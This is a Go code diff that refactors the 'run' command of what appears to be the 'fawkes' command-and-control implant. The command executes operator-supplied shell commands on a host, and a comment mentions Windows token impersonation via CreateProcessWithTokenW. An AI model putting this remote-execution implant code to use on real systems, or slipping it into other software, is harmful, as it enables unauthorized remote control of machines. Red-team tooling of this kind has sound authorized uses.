@@ -2,8 +2,6 @@ package commands
 
 import (
 	"fmt"
-	"os/exec"
-	"runtime"
 	"strings"
 
 	"fawkes/pkg/structs"
@@ -24,7 +22,6 @@ func (c *RunCommand) Description() string {
 
 // Execute executes the run command
 func (c *RunCommand) Execute(task structs.Task) structs.CommandResult {
-	// Check if parameters are provided
 	if task.Params == "" {
 		return structs.CommandResult{
 			Output:    "Error: No command specified",
@@ -33,23 +30,14 @@ func (c *RunCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Parse the command - handle shell execution based on OS
-	var cmd *exec.Cmd
-
-	if runtime.GOOS == "windows" {
-		// On Windows, use cmd.exe /c
-		cmd = exec.Command("cmd.exe", "/c", task.Params)
-	} else {
-		// On Unix-like systems, use sh -c
-		cmd = exec.Command("/bin/sh", "-c", task.Params)
-	}
-
-	// Capture combined output (stdout and stderr)
-	output, err := cmd.CombinedOutput()
+	// executeRunCommand is platform-specific:
+	// - Windows: uses CreateProcessWithTokenW when impersonating,
+	//   standard exec.Command otherwise
+	// - Unix: always uses /bin/sh -c
+	output, err := executeRunCommand(task.Params)
 
 	if err != nil {
-		// Even if there's an error, we might have output to show
-		outputStr := string(output)
+		outputStr := strings.TrimSpace(output)
 		if outputStr != "" {
 			return structs.CommandResult{
 				Output:    fmt.Sprintf("%s\nError: %v", outputStr, err),
@@ -64,8 +52,7 @@ func (c *RunCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Successful execution
-	outputStr := strings.TrimSpace(string(output))
+	outputStr := strings.TrimSpace(output)
 	if outputStr == "" {
 		outputStr = "Command executed successfully (no output)"
 	}
